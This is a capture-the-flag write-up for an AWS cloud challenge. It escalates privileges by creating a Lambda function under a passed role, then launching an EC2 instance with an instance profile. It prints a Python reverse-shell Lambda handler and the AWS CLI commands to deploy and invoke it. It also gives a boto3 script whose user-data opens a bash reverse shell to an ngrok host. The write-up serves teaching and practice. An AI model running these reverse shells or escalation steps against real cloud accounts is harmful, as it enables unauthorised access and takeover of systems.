<h1>Level 4B - CloudyNekos</h1>

<h2>Description</h2>

<blockquote>

It was said that their access system e-service was diguised as a blog site.</p>

<h2>Solution</h2>

<h3>Dumping S3 Bucket</h3>

<p>Visiting the webpage, we see the following clues in the HTML source.</p>

<p>```markup</p>

<div class="p-5 text-center bg-light">
  <!-- Passcode -->
  <h1 class="mb-3">Cats rule the world</h1>
  <!-- Passcode -->
  <!-- 
    ----- Completed -----
    * Configure CloudFront to use the bucket - palindromecloudynekos as the origin

    ----- TODO -----
    * Configure custom header referrer and enforce S3 bucket to only accept that particular header
    * Secure all object access
  -->
  <h4 class="mb-3">—ฅ/ᐠ. ̫ .ᐟ\ฅ —</h4>
</div>

<p>```</p>

<p>Here's what this is referring to - CloudFront is Amazon's CDN and can be configured to use an S3 bucket as its origin. The CloudFront site will then use files on the S3 buckets to serve the static page. But even so, the user could just access the S3 instance directly. The missing step here is to restrict direct access to the S3 bucket except from authenticated requests from CloudFront using Origin Access Identity (OAI).</p>

<p>In particular, we had <code>lambda:CreateFunction</code>, <code>lambda:InvokeFunction</code> and <code>iam:PassRole</code> privileges.&#x20;</p>

<p>The reason these did not show up in <code>enumerate-iam</code> is probably because <code>enumerate-iam</code> only does a naive bruteforce by attempting to invoke each privilege without any specific format as required in this challenge (e.g. <code>arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*</code>)</p>

<p>At this point we can consult this <a href="https://github.com/BishopFox/iam-vulnerable/blob/main/README.md">great resource</a> by Bishop Fox that provides a nice table breakdown of different AWS privilege escalation techniques. Our current permissions correspond to technique 15 <a href="https://bishopfox.com/blog/privilege-escalation-in-aws">here</a>, which involves creating a Lambda function that assumes a privileged role, thus executing code with higher privileges.</p>

<p>First, we create a Python script that gives us a reverse shell.</p>

<p>```python
import os
import socket
import subprocess</p>

<p>def lambda<em>handler(event, context):
    s = socket.socket(socket.AF</em>INET, socket.SOCK_STREAM)
    s.connect(("HOST", PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])
```</p>

<p>Then we zip this into a zip file like <code>function.zip</code>, and create a lambda function adhering to the name format above. Using <code>--role</code>, we pass the <code>lambda_agent_development_role</code> to this lambda function.</p>

<p>{% code overflow="wrap" %}
<code>
aws lambda create-function --function-name function:user-b5089e5404f049168e93e51cdba5d212-test --runtime python3.9 --role arn:aws:iam::051751498533:role/lambda_agent_development_role --handler code.lambda_handler --zip-file fileb://function.zip --timeout 100
</code>
{% endcode %}</p>

<p>After invoking the lambda function, we get a reverse shell on our listener!</p>

<p>{% code overflow="wrap" %}
<code>
aws lambda invoke --function-name user-b5089e5404f049168e93e51cdba5d212-test output.txt
</code>
{% endcode %}</p>

<h3>Getting ec2_agent_role</h3>

<p>Now that we have access to <code>lambda_agent_development_role</code>, let's see how we can leverage our newfound permissions. After enumerating permissions again with our trusty enumeration scripts, we find out that we now have the permission to create EC2 instances.</p>

<p>At this point we need to remember this piece of information given to us early in the challenge, telling us the tags that are required.</p>

<p>{% code overflow="wrap" %}
<code>
All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
</code>
{% endcode %}</p>

<p>Our current permissions now correspond to technique 3 <a href="https://bishopfox.com/blog/privilege-escalation-in-aws">here</a>, involving the <code>iam:PassRole and ec2:RunInstances</code> permissions. Essentially, we could pass in an <code>--iam-instance-profile</code> to assign a role to the EC2 instance.</p>

<p>But in order to gain access to our newfound privileges we would need a way to gain access to our newly created EC2 instance. In this article, the authors leveraged the assigning of SSH key pairs and gained access through the public IP address of the EC2 instance.</p>

<blockquote>
  <ul>
  <li>The user needs to have some way to SSH into the newly created instance.
  <ul>
  <li>In the example below, the user assigns a public SSH key stored in AWS to the instance and the user has access to the matching private key.</li>
  </ul></li>
  </ul>
</blockquote>

<p>In this challenge, however, this method does not seem quite so feasible (in particular, I had a hard time figuring out how to get the public IP of the instance since we only had access to <code>run-instances</code> but <em>not</em> <code>describe-instances</code>).&#x20;</p>

<p>It turned out there was a way to do this by using idempotency tokens, which allowed us to get updated information on the result of a previous command. As this was not my solution, I won't discuss it in detail.</p>

<blockquote>
  <p>Idempotency ensures that an API request completes no more than one time. With an idempotent request, if the original request completes successfully, any subsequent retries complete successfully without performing any further actions. However, the result might contain updated information, such as the current creation status.</p>
</blockquote>

<p>After a bit more googling, I came across this <a href="https://s3cur3.it/home/practicing-aws-security-with-iamvulnerable-part-2">blog post</a> containing a similar scenario as the one we have here. It turns out that the <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html"><code>user-data</code></a> option can be used to execute a script on startup. This is meant to help perform common configuration and setup tasks when provisioning an EC2 instance.</p>

<p>Piecing it all together, we can modify our previous lambda function to spawn an EC2 instance that runs a reverse shell on startup.</p>

<p>```python
import json
import boto3
import base64</p>

<p>def lambda<em>handler(event, context):
  client = boto3.client('ec2')
  response = client.run</em>instances(
    ImageId='ami-0b89f7b3f054b957e',
    SubnetId='subnet-0aa6ecdf900166741',
    TagSpecifications=[
        {
            'ResourceType': 'instance',
            'Tags': [
                {
                    'Key': 'agent',
                    'Value': 'user-17416bc58b3f40aa95a139bffdac450a'
                },
            ]
        },
    ],
    MaxCount=1,
    MinCount=1,
    IamInstanceProfile={
        'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2<em>agent</em>instance_profile'
    },
    UserData=base64.b64encode(b'#!/bin/bash\n\n/bin/bash -l &gt; /dev/tcp/4.tcp.ngrok.io/18673 0&lt;&amp;1 2>&amp;1\n').decode('utf-8')
  )
  return json.loads(json.dumps(response, default=str))
```</p>

<p>And we're in! We now have the <code>ec2_agent_role</code>.</p>
